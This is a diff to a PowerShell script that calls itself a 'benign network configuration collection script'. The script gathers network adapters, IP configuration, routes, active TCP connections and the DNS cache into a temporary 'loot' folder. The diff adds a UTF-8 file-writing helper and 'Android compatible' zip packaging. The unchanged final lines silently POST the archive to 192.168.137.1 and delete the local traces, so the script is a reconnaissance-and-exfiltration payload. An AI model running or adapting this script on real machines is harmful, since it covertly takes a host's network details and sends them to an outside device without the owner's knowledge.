@@ -1,35 +1,66 @@
 # Benign network configuration collection script
 # Collects network interface and routing information
 
+# Helper function to write UTF-8 files (readable on Android/Linux)
+function Write-LootFile {
+    param([string]$Path, [string]$Content)
+    try {
+        $utf8NoBom = New-Object System.Text.UTF8Encoding $false
+        $bytes = $utf8NoBom.GetBytes($Content)
+        [System.IO.File]::WriteAllBytes($Path, $bytes)
+    } catch {
+        $Content | Out-File -FilePath $Path -Encoding ASCII -Force
+    }
+}
+
 $OutputDir = "$env:TEMP\loot_$PID"
 New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
 
 # Network adapters
-"=== Network Adapters ===" | Out-File "$OutputDir\network_config.txt"
-Get-NetAdapter | Out-File "$OutputDir\network_config.txt" -Append
-ipconfig /all | Out-File "$OutputDir\network_config.txt" -Append
+$content = "=== Network Adapters ===`n" + (Get-NetAdapter | Format-List | Out-String) + "`n" + (ipconfig /all | Out-String)
+Write-LootFile -Path "$OutputDir\network_config.txt" -Content $content
 
 # IP configuration
-"=== IP Configuration ===" | Out-File "$OutputDir\ip_config.txt"
-Get-NetIPAddress | Out-File "$OutputDir\ip_config.txt" -Append
-Get-NetIPConfiguration | Out-File "$OutputDir\ip_config.txt" -Append
+$content = "=== IP Configuration ===`n" + (Get-NetIPAddress | Format-Table -AutoSize | Out-String -Width 200) + "`n" + (Get-NetIPConfiguration | Format-List | Out-String)
+Write-LootFile -Path "$OutputDir\ip_config.txt" -Content $content
 
 # Routing table
-"=== Routing Table ===" | Out-File "$OutputDir\routes.txt"
-Get-NetRoute | Out-File "$OutputDir\routes.txt" -Append
-route print | Out-File "$OutputDir\routes.txt" -Append
+$content = "=== Routing Table ===`n" + (Get-NetRoute | Format-Table -AutoSize | Out-String -Width 200) + "`n" + (route print | Out-String)
+Write-LootFile -Path "$OutputDir\routes.txt" -Content $content
 
 # Active connections
-"=== Active Connections ===" | Out-File "$OutputDir\connections.txt"
-Get-NetTCPConnection | Out-File "$OutputDir\connections.txt" -Append
-netstat -ano | Out-File "$OutputDir\connections.txt" -Append
+$content = "=== Active Connections ===`n" + (Get-NetTCPConnection | Format-Table -AutoSize | Out-String -Width 200) + "`n" + (netstat -ano | Out-String)
+Write-LootFile -Path "$OutputDir\connections.txt" -Content $content
 
 # DNS cache
-"=== DNS Cache ===" | Out-File "$OutputDir\dns.txt"
-Get-DnsClientCache | Out-File "$OutputDir\dns.txt" -Append
+try {
+    $content = "=== DNS Cache ===`n" + (Get-DnsClientCache | Format-Table -AutoSize | Out-String -Width 200)
+    Write-LootFile -Path "$OutputDir\dns.txt" -Content $content
+} catch {
+    Write-LootFile -Path "$OutputDir\dns.txt" -Content "DNS cache collection failed"
+}
 
-# Create archive and send
+# Create archive with forward slashes (Android compatible)
 $ArchivePath = "$env:TEMP\loot.zip"
-Compress-Archive -Path $OutputDir -DestinationPath $ArchivePath -Force
+if (Test-Path $ArchivePath) { Remove-Item -Force $ArchivePath -ErrorAction SilentlyContinue }
+
+try {
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    $zip = [System.IO.Compression.ZipFile]::Open($ArchivePath, 'Create')
+    try {
+        Get-ChildItem -Path $OutputDir -File -Recurse | ForEach-Object {
+            $relativePath = $_.FullName.Substring($OutputDir.Length + 1).Replace('\', '/')
+            $entry = $zip.CreateEntry($relativePath)
+            $entryStream = $entry.Open()
+            try {
+                $fileStream = [System.IO.File]::OpenRead($_.FullName)
+                try { $fileStream.CopyTo($entryStream) } finally { $fileStream.Close() }
+            } finally { $entryStream.Close() }
+        }
+    } finally { $zip.Dispose() }
+} catch {
+    Compress-Archive -Path $OutputDir -DestinationPath $ArchivePath -Force
+}
+
 Invoke-RestMethod -Uri "http://192.168.137.1/" -Method Post -InFile $ArchivePath -ErrorAction SilentlyContinue
 Remove-Item -Recurse -Force $OutputDir, $ArchivePath -ErrorAction SilentlyContinue
